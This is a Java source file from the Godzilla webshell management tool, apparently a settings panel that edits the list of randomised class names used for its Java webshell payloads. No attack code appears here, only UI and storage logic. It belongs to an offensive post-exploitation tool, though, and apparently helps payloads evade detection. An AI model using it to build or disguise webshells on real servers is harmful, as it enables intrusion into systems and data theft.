package net.BeichenDream.Godzilla.shells.payloads.java;

import net.BeichenDream.Godzilla.core.Db;
import net.BeichenDream.Godzilla.core.ui.component.RTextArea;
import net.BeichenDream.Godzilla.core.ui.component.dialog.AppSeting;
import java.awt.BorderLayout;
import java.awt.Component;
import java.awt.Dimension;
import java.awt.event.ActionEvent;
import java.io.InputStream;
import java.util.Arrays;
import java.util.HashSet;
import javax.swing.JButton;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import net.BeichenDream.Godzilla.util.Log;
import net.BeichenDream.Godzilla.util.automaticBindClick;
import net.BeichenDream.Godzilla.util.functions;

public class DynamicUpdateClass extends JPanel {
  public static final String ENVNAME = "DynamicClassNames";
  private final RTextArea classNameTextArea = new RTextArea();
  private final JButton updateHeaderButton = new JButton("修改");

  public DynamicUpdateClass() {
    super(new BorderLayout(1, 1));
    this.classNameTextArea.setText(Db.getSetingValue("DynamicClassNames", readDefaultClassName()));
    Dimension dimension = new Dimension();
    dimension.height = 30;
    JSplitPane splitPane = new JSplitPane();
    splitPane.setOrientation(0);
    JPanel bottomPanel = new JPanel();
    splitPane.setTopComponent(new JScrollPane(this.classNameTextArea));
    bottomPanel.add(this.updateHeaderButton);
    bottomPanel.setMaximumSize(dimension);
    bottomPanel.setMinimumSize(dimension);
    splitPane.setBottomComponent(bottomPanel);
    splitPane.setResizeWeight(0.9D);
    automaticBindClick.bindJButtonClick(this, this);
    this.add(splitPane);
  }

  private static String readDefaultClassName() {
    byte[] data = null;

    try {
      InputStream fileInputStream = DynamicUpdateClass.class.getResourceAsStream("assets/classNames.txt");
      data = functions.readInputStream(fileInputStream);
      fileInputStream.close();
    } catch (Exception var3) {
      Log.error(var3);
    }

    return new String(data);
  }

  public static HashSet getAllDynamicClassName() {
    String classNameString = Db.getSetingValue("DynamicClassNames", readDefaultClassName());
    String[] classNames = classNameString.split("\n");
    HashSet<String> classNameSet = new HashSet();
    Arrays.stream(classNames).forEach((name) -> {
      if (name.trim().length() > 0) {
        classNameSet.add(name.trim());
      }

    });
    return classNameSet;
  }

  private void updateHeaderButtonClick(ActionEvent actionEvent) {
    String classNameString = this.classNameTextArea.getText();
    String[] classNames = classNameString.split("\n");
    HashSet<String> classNameSet = new HashSet();
    Arrays.stream(classNames).forEach((name) -> {
      if (name.trim().length() > 0) {
        classNameSet.add(name.trim());
      }

    });
    if (classNameSet.size() > 50) {
      Db.updateSetingKV("DynamicClassNames", classNameString);
      JOptionPane.showMessageDialog((Component)null, "修改成功", "提示", 1);
    } else {
      JOptionPane.showMessageDialog((Component)null, "ClassName 少于50个", "错误提示", 1);
    }

  }

  static {
    AppSeting.registerPluginSeting("Java动态Class名字", DynamicUpdateClass.class);
  }
}